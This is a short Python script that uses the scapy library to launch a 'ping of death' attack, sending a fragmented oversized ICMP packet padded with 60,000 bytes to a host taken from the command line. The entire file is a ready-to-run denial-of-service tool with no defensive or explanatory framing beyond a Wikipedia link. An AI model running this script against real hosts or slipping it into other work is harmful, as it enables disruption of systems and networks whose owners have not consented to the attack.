from scapy.all import *
import sys

## Ping of death
def ping_of_death_attack():
    host = sys.argv[1]
    # https://en.wikipedia.org/wiki/Ping_of_death
    send(fragment(IP(dst=host)/ICMP()/("X"*60000)))

if __name__ == "__main__":
    ping_of_death_attack()
